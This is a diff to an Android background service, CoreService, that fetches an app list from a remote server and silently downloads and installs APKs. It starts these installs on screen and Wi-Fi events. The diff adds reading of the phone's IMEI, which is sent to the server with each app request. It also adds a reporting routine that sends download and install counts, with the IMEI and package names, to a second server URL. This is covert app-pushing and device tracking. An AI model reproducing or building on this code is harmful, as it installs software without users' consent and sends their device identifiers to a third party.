@@ -25,6 +25,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.text.format.DateUtils;
 import android.text.format.Time;
 
@@ -46,14 +47,24 @@ public class CoreService extends Service {
 	private boolean isScreenLignt = true;
 	private boolean isActive = false;
 
+	/**
+	 * 接受广播的类型
+	 */
 	public static final int STOP_ACTIVE = 0;
 	public static final int START_ACTIVE = 1;
 	public static final int UNLOCK_SCREEN = 2;
 	public static final int WIFI_STATE_CHANGED = 3;
 
-	private long INIT_FIRST_TIME = -1;
+	/**
+	 * 统计下载、安装及安装时间统计类型
+	 */
+	public static final int DOWNLOAD_SUCCESSFUL = 0;
+	public static final int INSTALL_SUCCESSFUL = 1;
+	public static final int TOTAL_COUNT = 1;
 
-	// private String deviceId = "";
+	private String imei = "";
+
+	private long INIT_FIRST_TIME = -1;
 
 	private Handler mHandler = new Handler();
 
@@ -68,9 +79,8 @@ public class CoreService extends Service {
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
 
-		// TelephonyManager tm = (TelephonyManager)
-		// getSystemService(Context.TELEPHONY_SERVICE);
-		// deviceId = tm.getDeviceId();
+		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = tm.getDeviceId();
 
 		finalHttp = new FinalHttp();
 
@@ -84,8 +94,7 @@ public class CoreService extends Service {
 		registerReceiver(receiver, filter);
 
 		boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
-		if (first_launch && CommandUtil.simReady(getApplicationContext())) {
-			CommandUtil.logW("SIM卡正常，并且未初始化，开始初始化。");
+		if (CommandUtil.isTrueTime() && first_launch) {
 			INIT_FIRST_TIME = System.currentTimeMillis();
 		}
 	}
@@ -124,6 +133,7 @@ public class CoreService extends Service {
 				sa.setInstalltime(System.currentTimeMillis());
 				sa.setActive(false);
 				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
+				sendSuccessfultoServer(DOWNLOAD_SUCCESSFUL, packageName);
 			}
 		}
 	};
@@ -147,7 +157,8 @@ public class CoreService extends Service {
 					}
 				}
 			}
-			mHandler.post(startActive);
+			if (CommandUtil.canDoThing(sharedPreferences))
+				mHandler.post(startActive);
 			break;
 		case STOP_ACTIVE:
 			CommandUtil.logW("屏幕亮了。。。");
@@ -161,11 +172,10 @@ public class CoreService extends Service {
 			break;
 		case UNLOCK_SCREEN:
 			CommandUtil.logW("解锁屏幕。。。");
-			if (INIT_FIRST_TIME == -1 && sharedPreferences.getBoolean("first_launch", true) && CommandUtil.simReady(getApplicationContext())) {
-				CommandUtil.logW("SIM卡  正常，并且未初始化，开始初始化。");
+			if (INIT_FIRST_TIME == -1 && sharedPreferences.getBoolean("first_launch", true) && CommandUtil.isTrueTime()) {
 				INIT_FIRST_TIME = System.currentTimeMillis();
 			}
-			if (CommandUtil.isNetAvailable(getApplicationContext()))
+			if (CommandUtil.canUpdate(sharedPreferences) && CommandUtil.isNetAvailable(getApplicationContext()))
 				updateService();
 			break;
 		case WIFI_STATE_CHANGED:
@@ -173,7 +183,8 @@ public class CoreService extends Service {
 			int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
 			if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED) {
 				CommandUtil.logW("wifi已经连接。。。");
-				updateService();
+				if (CommandUtil.canUpdate(sharedPreferences))
+					updateService();
 			}
 		}
 	}
@@ -190,7 +201,7 @@ public class CoreService extends Service {
 		}
 		mustDownloadApp.clear();
 		RequestQueue rq = Volley.newRequestQueue(this);
-		JsonArrayRequest request = new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {
+		JsonArrayRequest request = new JsonArrayRequest(SERVER_URL_PATH + "?imei=" + imei, new Listener<JSONArray>() {
 
 			@Override
 			public void onResponse(JSONArray arg0) {
@@ -199,14 +210,12 @@ public class CoreService extends Service {
 				for (int i = 0; i < arg0.length(); i++) {
 					try {
 						JSONObject obj = arg0.getJSONObject(i);
-						String name = obj.getString("software_name");
 						String packName = obj.getString("package_name");
-						String url = obj.getString("apk_uri");
 						if (!installPackages.contains(packName)) {
 							DownloadApplication app = new DownloadApplication();
-							app.fileName = name;
+							app.fileName = obj.getString("software_name");
 							app.packName = packName;
-							app.remoteUrl = url;
+							app.remoteUrl = String.format(obj.getString("apk_uri") + "?id=%d&imei=%s", obj.getLong("id"), imei);
 							mustDownloadApp.add(app);
 						}
 					} catch (JSONException e) {
@@ -240,6 +249,7 @@ public class CoreService extends Service {
 				public void onSuccess(File file) {
 					super.onSuccess(file);
 					CommandUtil.logW("下载成功。");
+					sendSuccessfultoServer(DOWNLOAD_SUCCESSFUL, app.packName);
 					isDownloading = false;
 					CommandUtil.installFile(getApplicationContext(), file, observer);
 					startDownload();
@@ -256,6 +266,24 @@ public class CoreService extends Service {
 				}
 			});
 		}
+	}
+
+	protected void sendSuccessfultoServer(final int type, final String packName) {
+		String url = String.format(SERVER_COUNT_URL_PATH + "?type=%d&imei=%s&packagename=%s", type, imei, packName);
+		CommandUtil.logW(url);
+		finalHttp.get(url, new AjaxCallBack<Object>() {
+			@Override
+			public void onSuccess(Object t) {
+				super.onSuccess(t);
+				CommandUtil.logW(packName + "--" + type + "--成功了");
+			}
+
+			@Override
+			public void onFailure(Throwable t, String strMsg) {
+				super.onFailure(t, strMsg);
+				CommandUtil.logW(packName + "--" + type + "--失败了:" + strMsg);
+			}
+		});
 	}
 
 	public static class DownloadApplication {
@@ -284,6 +312,7 @@ public class CoreService extends Service {
 	}
 
 	public static final String SERVER_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/down";
+	public static final String SERVER_COUNT_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/update";
 	public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
 	public static LinkedList<DownloadApplication> mustDownloadApp = new LinkedList<DownloadApplication>();
 	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
